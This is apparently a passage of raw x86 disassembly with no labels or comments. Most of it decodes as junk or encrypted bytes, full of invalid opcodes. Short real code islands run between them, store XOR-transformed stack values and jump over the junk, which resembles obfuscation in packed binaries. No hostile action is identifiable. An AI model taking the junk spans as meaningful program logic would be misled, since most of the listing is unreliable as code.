  402143:	mov    esi,0xf8dbf79d
  402148:	and    eax,0x2a4bf32
  40214d:	mov    eax,ds:0x458b50af
  402152:	call   0x40cb5c
  402157:	add    cl,ch
  402159:	pushf  
  40215a:	add    DWORD PTR [eax],eax
  40215c:	add    ch,dh
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	imul   edi,DWORD PTR [edi],0x21ecc59
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402127
  402176:	dec    ebp
  402177:	call   0xb3cc446f
  40217c:	les    edi,FWORD PTR [ecx+0x69]
  40217f:	mov    al,0x34
  402181:	xor    BYTE PTR [ebx-0x76f5b7a2],al
  402187:	cdq    
  402188:	mov    dl,0x29
  40218a:	sub    esp,DWORD PTR [edi-0x79]
  40218d:	iret   
  40218e:	dec    eax
  40218f:	jmp    0x40213d
  402191:	fsub   QWORD PTR [ebx-0x2e2458da]
  402197:	(bad)  
  402199:	sub    edi,DWORD PTR [ebx]
  40219b:	push   ds
  40219c:	je     0x402131
  40219e:	cmpps  xmm1,XMMWORD PTR [bx+di],0xbf
  4021a3:	jo     0x40212c
  4021a5:	stos   BYTE PTR es:[edi],al
  4021a6:	sar    DWORD PTR ds:0xf36fdf3a,0x4d
  4021ad:	cli    
  4021ae:	jp     0x4021a4
  4021b0:	dec    ebx
  4021b1:	out    dx,al
  4021b2:	loope  0x4021de
  4021b4:	popf   
  4021b5:	add    ecx,ebx
  4021b7:	popf   
  4021b8:	test   DWORD PTR [esi+0x7a],edi
  4021bb:	aaa    
  4021bc:	adc    eax,edi
  4021be:	mov    al,ds:0xd847acc1
  4021c3:	das    
  4021c4:	xchg   edi,eax
  4021c5:	xor    BYTE PTR [ebx+0x4e],bh
  4021c8:	fsub   DWORD PTR [ebp+0x78]
  4021cb:	adc    BYTE PTR [edi],cl
  4021cd:	push   edi
  4021ce:	int3   
  4021cf:	xchg   ebx,eax
  4021d0:	add    eax,0x9c69ba8
  4021d5:	mov    al,0xb9
  4021d7:	mov    al,ds:0xfb764bc3
  4021dc:	jae    0x402196
  4021de:	cmc    
  4021df:	pop    ebx
  4021e0:	popa   
  4021e1:	je     0x4021f5
  4021e3:	mov    ch,0x67
  4021e5:	rcr    BYTE PTR [ebp+0x3b],1
  4021e8:	jne    0x40217f
  4021ea:	fisttp DWORD PTR [edx]
  4021ec:	fcom   QWORD PTR [ebx+0x277d694b]
  4021f2:	dec    eax
  4021f3:	and    al,0xc7
  4021f5:	sub    ebx,DWORD PTR [edi+0x3d]
  4021f8:	jg     0x402278
  4021fa:	push   ebp
  4021fb:	mov    dl,0xb2
  4021fd:	or     BYTE PTR ds:0x7c861cb9,al
  402203:	adc    al,0x13
  402205:	cwde   
  402206:	cli    
  402207:	mov    esp,0x67365dcf
  40220c:	imul   edi,DWORD PTR ds:0x54bf8f1d,0xffffff8f
  402213:	mov    ds,WORD PTR [eax]
  402215:	jbe    0x4021e3
  402217:	and    eax,0x119faa51
  40221c:	scas   eax,DWORD PTR es:[edi]
  40221d:	push   cs
  40221e:	sub    cl,ah
  402220:	popf   
  402221:	div    BYTE PTR [edx]
  402223:	sub    bh,BYTE PTR [edx]
  402225:	and    eax,0x6493707d
  40222a:	dec    ebp
  40222b:	das    
  40222c:	sub    eax,0xc9077575
  402231:	mov    eax,0xee2beb73
  402236:	mov    ecx,0xbb42ffa2
  40223b:	pop    es
  40223c:	cmp    DWORD PTR [ebx-0x25],ecx
  40223f:	sub    al,0x2c
  402241:	test   eax,0x911dfce7
  402246:	xchg   ebx,eax
  402247:	and    DWORD PTR [edx+eiz*2+0x4dff5190],0xffffff8d
  40224f:	xchg   esi,eax
  402250:	xchg   esp,eax
  402251:	ja     0x402203
  402253:	pop    ecx
  402254:	pop    eax
  402255:	push   ss
  402256:	test   eax,0xd4b444aa
  40225b:	popfw  
  40225d:	adc    eax,0x44a033a8
  402262:	stc    
  402263:	iret   
  402264:	add    ecx,DWORD PTR [edx+0x69a10c46]
  40226a:	dec    esp
  40226b:	xchg   ebx,eax
  40226c:	inc    ebx
  40226d:	dec    ecx
  40226e:	(bad)  
  40226f:	adc    ecx,ecx
  402271:	aas    
  402272:	(bad)  
  402273:	jmp    0x4022e8
  402275:	inc    ebx
  402276:	jb     0x4022e3
  402278:	popf   
  402279:	push   ebp
  40227a:	pop    ebx
  40227b:	(bad)  
  40227c:	xchg   ebp,eax
  40227d:	push   cs
  40227e:	outs   dx,DWORD PTR ds:[esi]
  40227f:	push   ebp
  402280:	or     bl,dl
  402282:	dec    ecx
  402283:	mov    al,ds:0xe0c88cd9
  402288:	cs dec edi
  40228a:	sbb    bh,0xcd
  40228d:	mov    cs,WORD PTR [ebx+0x7850cc07]
  402293:	jb     0x4022f6
  402295:	cdq    
  402296:	lea    ecx,[ecx+0x55dd7130]
  40229c:	inc    ebp
  40229d:	mov    DWORD PTR [esi+0x7e],0x7de879c9
  4022a4:	mov    al,ch
  4022a6:	add    al,0xd3
  4022a8:	mov    edi,0xc6df7375
  4022ad:	ds pop esp
  4022af:	out    0x8,al
  4022b1:	jle    0x402303
  4022b3:	fcomp  DWORD PTR [esi-0x15b6a33e]
  4022b9:	shl    BYTE PTR [edx],1
  4022bb:	xchg   ebx,eax
  4022bc:	push   edi
  4022bd:	lods   al,BYTE PTR ds:[esi]
  4022be:	popf   
  4022bf:	(bad)  
  4022c0:	outs   dx,BYTE PTR ds:[esi]
  4022c1:	test   bh,bl
  4022c3:	inc    eax
  4022c4:	cmp    al,0x56
  4022c6:	or     BYTE PTR [esi-0x5e03bf2a],bh
  4022cc:	mov    esp,gs
  4022ce:	out    dx,eax
  4022cf:	dec    ebp
  4022d0:	push   edi
  4022d1:	xchg   BYTE PTR [eax+0x7d0cf259],dh
  4022d7:	mov    bh,0x8
  4022d9:	enter  0x4844,0x48
  4022dd:	imul   edi,ecx,0xfce43be4
  4022e3:	cmp    esi,DWORD PTR [ebp+0x24]
  4022e6:	sbb    BYTE PTR [ecx-0x4b4c788b],0x56
  4022ed:	pop    es
  4022ee:	out    dx,al
  4022ef:	ret    
  4022f0:	cmp    bl,bl
  4022f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022f3:	or     DWORD PTR [edx+0x4bcee857],0x50
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	adc    bh,BYTE PTR [ebx+0x3a]
  40235a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x40230c
  402364:	cwde   
  402365:	jge    0x40239b
  402367:	adc    dh,dl
  402369:	mov    ch,0x99
  40236b:	fisub  WORD PTR [ebx+0xa29e143]
  402371:	pop    eax
  402372:	lea    ebx,[ecx-0x31]
  402375:	or     ah,dh
  402377:	xor    ebx,DWORD PTR [edx+0x607d35d9]
  40237d:	stos   DWORD PTR es:[edi],eax
  40237e:	jns    0x402306
  402380:	mov    WORD PTR [ebp-0x43151f66],ds
  402386:	rcl    BYTE PTR [edx-0x36],0x44
  40238a:	icebp  
  40238b:	adc    al,ch
  40238d:	cs into 
  40238f:	dec    edx
  402390:	inc    edi
  402391:	sahf   
  402392:	nop
  402393:	jl     0x40237a
  402395:	je     0x4023ae
  402397:	popf   
  402398:	cmp    cl,dh
  40239a:	mov    ebx,0xb51c0756
  40239f:	pop    edi
  4023a0:	addr16 push eax
  4023a2:	repz in al,dx
  4023a4:	and    DWORD PTR [ecx+0x4e97d822],ebp
  4023aa:	xlat   BYTE PTR ds:[ebx]
  4023ab:	test   eax,0xc43afb2e
  4023b0:	das    
  4023b1:	add    eax,ebp
  4023b3:	loopne 0x40233e
  4023b5:	sar    cl,0x9b
  4023b8:	mov    ds:0x576c96c3,al
  4023bd:	int    0x1c
  4023bf:	or     ebx,ecx
  4023c1:	std    
  4023c2:	push   0x4b91f021
  4023c7:	and    al,0xd7
  4023c9:	(bad)  
  4023ca:	mov    ah,0x6d
  4023cc:	das    
  4023cd:	cmc    
  4023ce:	push   esi
  4023cf:	fldenv [eax]
  4023d1:	mov    ebx,0x7a4d3eb
  4023d6:	std    
  4023d7:	pop    es
  4023d8:	add    BYTE PTR [esi+eax*2+0x13],ch
  4023dc:	dec    ebp
  4023dd:	pop    ds
  4023de:	retf   
  4023df:	dec    ebp
  4023e0:	adc    al,0xd2
  4023e2:	xor    eax,0xfb21d946
  4023e7:	push   esi
  4023e8:	rol    cl,cl
  4023ea:	lods   al,BYTE PTR ds:[esi]
  4023eb:	and    DWORD PTR [esi],0x767ec1d0
  4023f1:	loop   0x40240b
  4023f3:	mov    ebx,0x86f1c5b6
  4023f8:	dec    edi
  4023f9:	dec    ebp
  4023fa:	mov    esi,0x1f30e4e0
  4023ff:	jae    0x4023ff
  402401:	adc    eax,DWORD PTR [ebx-0x20170ee6]
  402407:	shl    BYTE PTR [ebx],1
  402409:	fmul   QWORD PTR [ecx]
  40240b:	push   ds
  40240c:	and    esi,edi
  40240e:	inc    esi
  40240f:	adc    edx,ebp
  402411:	sar    DWORD PTR [ebp+0x29],0x26
  402415:	dec    edx
  402416:	mov    eax,0x284d19d2
  40241b:	cld    
  40241c:	arpl   WORD PTR [esi+0x63d1d778],bx
  402422:	loop   0x4023b5
  402424:	ret    
  402425:	outs   dx,BYTE PTR ds:[esi]
  402426:	mov    WORD PTR [esp+esi*8-0x654a0cc5],ds
  40242d:	out    0xf1,al
  40242f:	arpl   bp,dx
  402431:	sbb    ecx,DWORD PTR [eax-0x3b5301b0]
  402437:	jge    0x4023ea
  402439:	cld    
  40243a:	jmp    0x4024a2
  40243c:	icebp  
  40243d:	(bad)  
  40243e:	cwde   
  40243f:	jbe    0x4023c1
  402441:	iret   
  402442:	enter  0xae3,0x20
  402446:	inc    ebx
  402448:	pop    edi
  402449:	gs add al,0xd3
  40244c:	xor    bl,ah
  40244e:	xor    ecx,eax
  402450:	mov    ch,0xd5
  402452:	dec    edi
  402453:	mov    ds:0xcdc126b1,al
  402458:	arpl   WORD PTR [ebx+0x21d0918],cx
  40245e:	ret    
  40245f:	int3   
  402460:	inc    edx
  402461:	mov    ch,BYTE PTR [eax+0x54d98a57]
  402467:	in     eax,0x52
  402469:	out    0x72,al
  40246b:	push   eax
  40246c:	pop    ebx
  40246d:	xor    BYTE PTR [edi-0x6eb5f0de],dh
  402473:	or     al,0xdb
  402475:	ds jnp 0x402486
  402478:	(bad)  
  402479:	adc    eax,0xb70b4555
  40247e:	add    BYTE PTR [esi+0x622b21ed],cl
  402484:	fiadd  WORD PTR [eax+ebp*1-0x3e88421d]
  40248b:	xlat   BYTE PTR ds:[ebx]
  40248c:	lods   eax,DWORD PTR ds:[esi]
  40248d:	push   edx
  40248e:	and    ebx,DWORD PTR [esi]
  402490:	inc    edi
  402491:	inc    ebp
  402492:	(bad)  
  402493:	rcr    DWORD PTR [edi+0x519e4150],1
  402499:	push   ebp
  40249a:	js     0x402485
  40249c:	cmc    
  40249d:	lds    edx,FWORD PTR [ebx]
  40249f:	dec    ecx
  4024a0:	in     eax,dx
  4024a1:	sbb    ch,BYTE PTR [ebx+ebx*4-0x6da92087]
  4024a8:	mov    ds:0xa29b1d5,eax
  4024ad:	cmp    ebp,esi
  4024af:	int    0xba
  4024b1:	jl     0x4024c5
  4024b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024b4:	adc    al,dh
  4024b6:	jmp    0x1f2b2445
  4024bb:	sub    al,0x8f
  4024bd:	into   
  4024be:	inc    ecx
  4024bf:	call   0x3094:0xf9c9adeb
  4024c6:	cmp    bl,dl
  4024c8:	jg     0x4024f4
  4024ca:	mov    ds:0xf99385eb,al
  4024cf:	push   ds
  4024d0:	mov    fs,WORD PTR [esi]
  4024d2:	int3   
  4024d3:	(bad)  
  4024d4:	jb     0x40253f
  4024d6:	dec    esp
  4024d7:	pop    edx
  4024d8:	jmp    0x402500
  4024da:	jne    0x4024ab
  4024dc:	das    
  4024dd:	je     0x40249b
  4024df:	add    eax,0xf4eb3cfc
  4024e4:	lods   al,BYTE PTR ds:[esi]
  4024e5:	lea    ebp,[edi-0x75]
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	retf   
  40250e:	into   
  40250f:	xchg   ebx,eax
  402510:	stc    
  402511:	add    DWORD PTR es:[esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024d9
  40251a:	mov    ah,0xff
  40251c:	jb     0x402568
  40251e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40251f:	sbb    BYTE PTR [edi],0xd9
  402522:	in     eax,dx
  402523:	test   DWORD PTR [edi],esi
  402525:	add    cl,BYTE PTR [esi+0xb]
  402528:	mov    bh,0xc8
  40252a:	stos   BYTE PTR es:[edi],al
  40252b:	ja     0x40256f
  40252d:	test   BYTE PTR [esi-0x4e20c304],0x22
  402534:	dec    ecx
  402535:	push   esp
  402536:	rol    BYTE PTR [eax+0x2],0xf
  40253a:	mov    al,ds:0x6a6d6bcf
  40253f:	jmp    0xa3024a7
  402544:	fsub   st(1),st
  402546:	pop    ecx
  402547:	shl    BYTE PTR [edi+0x399bb4b1],1
  40254d:	xlat   BYTE PTR ds:[ebx]
  40254e:	mov    DWORD PTR [ebx-0x4b],eax
  402551:	jae    0x4025ad
  402553:	out    0x30,eax
  402555:	and    al,bh
  402557:	arpl   cx,si
  402559:	jmp    0x4024ff
  40255b:	lds    esp,FWORD PTR [edi-0x44]
  40255e:	inc    eax
  40255f:	stos   DWORD PTR es:[edi],eax
  402560:	sbb    edi,DWORD PTR [esi]
  402562:	(bad)  
  402564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402565:	sar    BYTE PTR [esp+ebp*1+0x36d3fd7d],1
  40256c:	and    al,0x50
  40256e:	add    cl,BYTE PTR ds:0x87e87c0
  402574:	inc    dh
  402576:	mov    al,bh
  402578:	in     al,dx
  402579:	xor    eax,0xcf71bc2c
  40257e:	push   cs
  40257f:	mov    edx,0x61bf6994
  402584:	xor    dl,cl
  402586:	sub    BYTE PTR [edi+0x56],dl
  402589:	xchg   ebx,eax
  40258a:	popa   
  40258b:	ret    0x614b
  40258e:	cmp    eax,0xfd7d952b
  402593:	icebp  
  402594:	mov    eax,ds:0x74dbf718
  402599:	arpl   WORD PTR [ecx-0x12],dx
  40259c:	and    BYTE PTR ds:[edi-0x1b],al
  4025a0:	je     0x4025f9
  4025a2:	sub    ah,bh
  4025a4:	int    0x4d
  4025a6:	mov    dh,0xe
  4025a8:	inc    ebx
  4025a9:	daa    
  4025aa:	imul   DWORD PTR [edi-0x2c35be40]
  4025b0:	call   0x1bf7acb0
  4025b5:	xor    al,0xbc
  4025b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b8:	and    DWORD PTR [eax+0x26],edx
  4025bb:	adc    eax,0xe1304731
  4025c0:	ins    BYTE PTR es:[edi],dx
  4025c1:	pop    ss
  4025c2:	sti    
  4025c3:	or     al,0x6f
  4025c5:	scas   eax,DWORD PTR es:[edi]
  4025c6:	out    dx,al
  4025c7:	pop    ss
  4025c8:	in     al,0x38
  4025ca:	in     al,dx
  4025cb:	stc    
  4025cc:	push   esp
  4025cd:	inc    edi
  4025ce:	pop    edi
  4025cf:	push   ecx
  4025d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025d1:	mov    ah,0x1f
  4025d3:	loop   0x402567
  4025d5:	cmp    eax,0xad08f6a8
  4025da:	push   ds
  4025db:	inc    ecx
  4025dc:	sub    DWORD PTR [ecx+0x18],edx
  4025df:	(bad)  
  4025e1:	js     0x40265a
  4025e3:	mov    WORD PTR [eax+0x49],gs
  4025e6:	jmp    0x81f1:0xbf8f9a91
  4025ed:	mov    esp,0xf0f441d7
  4025f2:	xchg   ecx,eax
  4025f3:	jl     0x40264e
  4025f5:	cmp    eax,0xd8e1a0ed
  4025fa:	addr16 mov esp,eax
  4025fd:	jle    0x4025c1
  4025ff:	popf   
  402600:	add    DWORD PTR [ebx+0x621a70ed],ebx
  402606:	pop    ebx
  402607:	push   0xac01bd89
  40260c:	call   0x2891:0xfacfd405
  402613:	or     DWORD PTR [ebx-0x347e195d],edi
  402619:	shl    DWORD PTR [edx],cl
  40261b:	and    eax,0xd30d0f75
  402620:	cmp    bl,BYTE PTR [esi+0x4c]
  402623:	dec    ebp
  402624:	mov    eax,0xbbcdf079
  402629:	div    bh
  40262b:	sbb    eax,DWORD PTR [edi]
  40262d:	pop    ss
  40262e:	or     eax,0xb004f224
  402633:	cmp    bl,bl
  402635:	aad    0x5e
  402637:	pop    DWORD PTR [edx-0x22]
  40263a:	jle    0x402640
  40263c:	clc    
  40263d:	mov    ebp,0xc81ca147
  402642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402643:	rol    ebx,1
  402645:	addr16 pusha 
  402647:	fwait
  402648:	sub    esp,ecx
  40264a:	hlt    
  40264b:	adc    BYTE PTR [esi-0xe4ff74d],bh
  402651:	push   0x6e6f0943
  402656:	out    dx,eax
  402657:	adc    dl,BYTE PTR [esi-0x18]
  40265a:	xchg   ecx,eax
  40265b:	call   0x645:0x59f01e47
  402662:	dec    edx
  402663:	rcr    DWORD PTR [esi-0x263c6558],0x2f
  40266a:	(bad)  
  40266b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40266c:	iret   
  40266d:	(bad)  
  40266e:	cmc    
  40266f:	jb     0x402610
  402671:	pop    ds
  402672:	mov    dh,0x9d
  402674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402675:	outs   dx,BYTE PTR ds:[esi]
  402676:	lahf   
  402677:	or     BYTE PTR [eax-0x2e],cl
  40267a:	mov    cl,0xc2
  40267c:	inc    edi
  40267d:	push   cs
  40267e:	neg    BYTE PTR [edi-0x60]
  402681:	sub    al,0x92
  402683:	imul   ecx,DWORD PTR [ecx+0x7],0xdc8cc7a9
  40268a:	mov    ds,WORD PTR [eax]
  40268c:	jmp    0x40263a
  40268e:	inc    ebx
  40268f:	and    DWORD PTR [edx-0x145a8318],edx
  402695:	or     eax,0x68931ec1
  40269a:	test   DWORD PTR [esi],ebx
  40269c:	outs   dx,BYTE PTR ds:[esi]
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	inc    ebp
  4026d3:	bound  ebx,QWORD PTR [ebp-0x23]
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x402716
  4026df:	push   edi
  4026e0:	sub    DWORD PTR fs:[esi],ecx
  4026e3:	push   ebp
  4026e4:	lods   eax,DWORD PTR ds:[esi]
  4026e5:	pop    ss
  4026e6:	(bad)  
  4026e8:	push   0x2d
  4026ea:	repnz adc edx,DWORD PTR [ebx]
  4026ed:	mov    bh,0x1c
  4026ef:	pop    esp
  4026f0:	add    BYTE PTR [edi-0x1a],al
  4026f3:	ins    DWORD PTR es:[edi],dx
  4026f4:	ss stos BYTE PTR es:[edi],al
  4026f6:	test   DWORD PTR [edi+0x7fead743],esi
  4026fc:	dec    ebx
  4026fd:	inc    esp
  4026fe:	idiv   dh
  402700:	xor    BYTE PTR [eax],cl
  402702:	aad    0x43
  402704:	mov    ecx,0x80d693dc
  402709:	sub    ecx,DWORD PTR [eax+ebp*8+0x42f99c98]
  402710:	out    0xdf,al
  402712:	out    dx,eax
  402713:	mov    al,0x6a
  402715:	nop
  402716:	popa   
  402717:	add    DWORD PTR [eax+0x65],edx
  40271a:	rdtsc  
  40271c:	repnz es pusha 
  40271f:	adc    al,0x40
  402721:	xchg   esi,eax
  402722:	push   ebp
  402723:	mov    es,WORD PTR [esi]
  402725:	jmp    0x4c18873c
  40272a:	ror    DWORD PTR cs:[edx],0x80
  40272e:	scas   al,BYTE PTR es:[edi]
  40272f:	mov    ebx,0x139dc23e
  402734:	pop    eax
  402735:	test   DWORD PTR [esi-0x57b2feeb],edx
  40273b:	jp     0x402778
  40273d:	leave  
  40273e:	les    esp,FWORD PTR ss:[eax]
  402741:	cs retf 0x9896
  402745:	xchg   dh,cl
  402747:	mov    cl,0x3a
  402749:	mov    bh,0xfe
  40274b:	xor    ebp,DWORD PTR [esi]
  40274d:	cs fcom st(7)
  402750:	shl    DWORD PTR [ebp+0x75759b8e],cl
  402756:	iret   
  402757:	sub    al,0xc2
  402759:	test   DWORD PTR [ecx],ebp
  40275b:	inc    BYTE PTR [esi-0x4ef5b3a9]
  402761:	clc    
  402762:	pop    ebx
  402763:	xlat   BYTE PTR ds:[ebx]
  402764:	and    DWORD PTR [edx+ecx*4+0x74],0xb9f2b2af
  40276c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40276d:	inc    edi
  40276e:	adc    bh,bl
  402770:	test   dl,bl
  402772:	mov    eax,0xebb9f5c
  402777:	jle    0x40272f
  402779:	push   edi
  40277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277b:	(bad)  
  40277c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40277d:	cwde   
  40277e:	lock jp 0x4027d3
  402781:	repnz xchg edx,eax
  402783:	inc    ebp
  402784:	mov    edi,0x16985189
  402789:	mov    BYTE PTR [esi+0x355e039],al
  40278f:	ret    0xe9c
  402792:	out    dx,al
  402793:	or     ch,0x35
  402796:	sbb    BYTE PTR [edi+0x196cdfa6],0xda
  40279d:	push   DWORD PTR [ecx]
  40279f:	mov    cl,0x5a
  4027a1:	xchg   esi,eax
  4027a2:	push   esi
  4027a3:	sbb    ch,BYTE PTR ds:0xcad0ed65
  4027a9:	cmp    BYTE PTR [ebx-0x36],bh
  4027ac:	xchg   esi,eax
  4027ad:	ret    
  4027ae:	das    
  4027af:	inc    edx
  4027b0:	loop   0x402803
  4027b2:	cdq    
  4027b3:	xchg   esp,eax
  4027b4:	ins    BYTE PTR es:[edi],dx
  4027b5:	(bad)  
  4027b7:	push   edx
  4027b8:	xor    esp,DWORD PTR [ebx]
  4027ba:	stc    
  4027bb:	retf   0xb354
  4027be:	mov    ah,0x4c
  4027c0:	inc    ebx
  4027c1:	scas   al,BYTE PTR es:[edi]
  4027c2:	sub    DWORD PTR [esi+edi*2],edi
  4027c5:	pop    edx
  4027c6:	inc    esp
  4027c7:	dec    edi
  4027c8:	(bad)  
  4027c9:	sbb    BYTE PTR ds:0xe10fe3d2,ch
  4027cf:	mov    ecx,0x553df916
  4027d4:	adc    bh,BYTE PTR [edx-0x33]
  4027d7:	push   edi
  4027d8:	xlat   BYTE PTR ds:[ebx]
  4027d9:	ins    DWORD PTR es:[edi],dx
  4027da:	hlt    
  4027db:	pop    edx
  4027dc:	or     al,cl
  4027de:	ret    
  4027df:	idiv   BYTE PTR [ecx+0xd]
  4027e2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e4:	leave  
  4027e5:	into   
  4027e6:	adc    BYTE PTR [ebx],ah
  4027e8:	gs pop ds
  4027ea:	gs (bad) 
  4027ec:	sub    edx,DWORD PTR [ecx]
  4027ee:	(bad)  
  4027ef:	xlat   BYTE PTR ds:[ebx]
  4027f0:	sbb    ebp,0x5ef611a
  4027f6:	jbe    0x402833
  4027f8:	mov    cs,WORD PTR [eax+0x56f58911]
  4027fe:	pop    esp
  4027ff:	imul   DWORD PTR [ebx+0x19]
  402802:	fninit 
  402804:	test   eax,0xf96bec33
  402809:	add    cl,BYTE PTR [ebx+ebp*1+0x50]
  40280d:	jmp    0x40280d
  40280f:	loop   0x402884
  402811:	in     eax,0xf2
  402813:	retf   0x13e8
  402816:	cwde   
  402817:	ja     0x4027a4
  402819:	scas   al,BYTE PTR es:[edi]
  40281a:	inc    esp
  40281b:	popa   
  40281c:	sub    DWORD PTR [esi-0x4e228497],edi
  402822:	outs   dx,BYTE PTR ds:[esi]
  402823:	sub    BYTE PTR [edx-0x4e9b666e],bl
  402829:	fstp   QWORD PTR [eax]
  40282b:	iret   
  40282c:	loop   0x40289f
  40282e:	jle    0x4027da
  402830:	pop    ecx
  402831:	cmp    BYTE PTR [ebp+0x2e],bl
  402834:	push   eax
  402835:	cdq    
  402836:	jmp    0x507d:0x3daeaeab
  40283d:	dec    esi
  40283e:	es out dx,eax
  402840:	and    DWORD PTR [ecx+0x71],ebp
  402843:	xchg   edx,eax
  402844:	jbe    0x402863
  402846:	loopne 0x40285d
  402848:	cdq    
  402849:	jno    0x402822
  40284b:	pop    ecx
  40284c:	inc    edx
  40284d:	sbb    eax,0x95414376
  402852:	arpl   WORD PTR [eax+0x65874325],sp
  402858:	push   edx
  402859:	inc    ebp
  40285a:	into   
  40285b:	xchg   edi,eax
  40285c:	out    dx,al
  40285d:	fld    QWORD PTR [edi-0x74140cb8]
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	xchg   edi,eax
  402884:	sub    BYTE PTR [esi+0x7e0c2e64],dl
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402888
  402890:	jbe    0x4028d5
  402892:	mov    ecx,0x7c0bab94
  402897:	dec    eax
  402898:	shl    BYTE PTR [esi+esi*8-0x68],1
  40289c:	in     eax,dx
  40289d:	loop   0x402845
  40289f:	sub    eax,0x188f66a
  4028a4:	jge    0x402922
  4028a6:	jb     0x4028dc
  4028a8:	xchg   edx,eax
  4028a9:	lahf   
  4028aa:	ret    
  4028ab:	xchg   edi,eax
  4028ac:	int3   
  4028ad:	scas   eax,DWORD PTR es:[edi]
  4028ae:	jge    0x4028a1
  4028b0:	call   0xc0936613
  4028b5:	les    ebx,FWORD PTR [ebp-0x2ab65601]
  4028bb:	int    0x78
  4028bd:	(bad)  
  4028be:	std    
  4028bf:	or     eax,0xa9528464
  4028c4:	sub    BYTE PTR [ecx+eax*4],0x6f
  4028c8:	fs cdq 
  4028ca:	sub    DWORD PTR [ebp+ecx*4+0x27],ecx
  4028ce:	pusha  
  4028cf:	repz push esp
  4028d1:	xchg   ecx,eax
  4028d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d3:	xor    ah,dl
  4028d5:	cwde   
  4028d6:	push   ebp
  4028d7:	dec    ebx
  4028d8:	push   ebx
  4028d9:	leave  
  4028da:	mov    al,ds:0xe32f34c
  4028df:	cmp    al,0x40
  4028e1:	mov    edx,DWORD PTR ds:0x95adc14
  4028e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028e8:	lock dec edi
  4028ea:	fimul  DWORD PTR ss:[esi+edi*4-0x6f8eca56]
  4028f2:	imul   ebp,DWORD PTR [edi+0x481f84fd],0xffffff9f
  4028f9:	mov    ebx,DWORD PTR [ecx+edi*1+0x6441ebfd]
  402900:	adc    DWORD PTR [eax+0x72],0x60
  402904:	fist   WORD PTR [esi]
  402906:	aad    0x7f
  402908:	inc    ebp
